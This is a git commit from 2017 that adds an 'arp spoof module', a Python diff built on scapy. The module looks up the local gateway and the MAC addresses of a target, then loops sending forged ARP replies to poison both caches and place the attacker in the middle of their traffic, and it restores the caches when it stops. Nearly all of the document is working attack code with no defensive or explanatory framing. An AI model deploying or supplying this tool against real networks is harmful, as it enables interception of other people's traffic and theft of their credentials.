6b31279689d8826192eb6a98e48ec1693caf8880
Sári László <slaszlo.bme@gmail.com>
2017-03-08 22:22:06 +0100

    arp spoof module

--- arpspoof.py
+++ arpspoof.py
@@ -1,37 +1,67 @@
 from threading import Thread
 from scapy.all import *
+import netifaces as ni
 
 
 stop = 1
 
 
 def ARP_poison(target_ip, gateway_ip, target_mac, gateway_mac, mac):
-    print("ARP poisoning...")
+    print("[*] ARP poisoning...")
 
     try:
+        global stop
         while stop:
             send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=mac, hwdst=target_mac), verbose=0)
             send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwsrc=mac, hwdst=gateway_mac), verbose=0)
     except Exception as e:
         print(str(e))
     finally:
-        print("ARP poisoning has ended")
+        clean_up(target_ip, gateway_ip, target_mac, gateway_mac)
+        print("[*] ARP poisoning has ended")
 
 
 def clean_up(target_ip, gateway_ip, target_mac, gateway_mac):
-    print("Cleaning arp cache")
+    print("[*] Cleaning arp cache...")
     send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=gateway_mac, hwdst=target_mac),
          verbose=0)
     send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwsrc=target_mac, hwdst=gateway_mac),
          verbose=0)
 
-arp_poison = Thread(target=ARP_poison, args=("192.168.0.31", "192.168.0.1", "08:00:27:bb:79:98", "24:76:7d:4b:1d:e5", "6c:88:14:be:24:2c"))
-arp_poison.start()
 
-try:
-    while arp_poison.is_alive():
-        time.sleep(1)
+def arpspoof(target_ip, interface):
+    #target_ip = "192.168.0.31"
 
-except KeyboardInterrupt:
-    stop = 0
-    clean_up("192.168.0.31", "192.168.0.1", "08:00:27:bb:79:98", "24:76:7d:4b:1d:e5")
+    if interface not in ni.interfaces():
+        print("No such network interface: " + interface)
+        exit(-1)
+    host_ip = ni.ifaddresses(interface)[2][0]['addr']
+    host_mac = ni.ifaddresses(interface)[ni.AF_LINK][0]['addr']
+
+    gws = ni.gateways()
+    gateway_ip = gws['default'][ni.AF_INET][0]
+
+    print("[*] Getting MAC address of default gateway...")
+    pkt = sr1(ARP(op=ARP.who_has, psrc=host_ip, pdst=gateway_ip), verbose=0, retry=30)
+    gateway_mac = pkt[ARP].hwsrc
+    if gateway_mac is None:
+        print("[*] Could not get MAC address of default gateway")
+        exit(-1)
+
+    print("[*] Getting MAC address of target...")
+    pkt = sr1(ARP(op=ARP.who_has, psrc=host_ip, pdst=target_ip), verbose=0, retry=30)
+    target_mac = pkt[ARP].hwsrc
+    if target_mac is None:
+        print("[*] Could not get MAC address of target")
+        exit(-1)
+
+    print("\tHost IP: ", host_ip)
+    print("\tHost MAC: ", host_mac)
+    print("\tDefault gateway IP: ", gateway_ip)
+    print("\tDefault gateway MAC: ", gateway_mac)
+    print("\tTarget IP: ", target_ip)
+    print("\tTarget MAC: ", target_mac)
+
+    arp_poison = Thread(target=ARP_poison, args=(target_ip, gateway_ip, target_mac, gateway_mac, host_mac))
+    arp_poison.start()
+
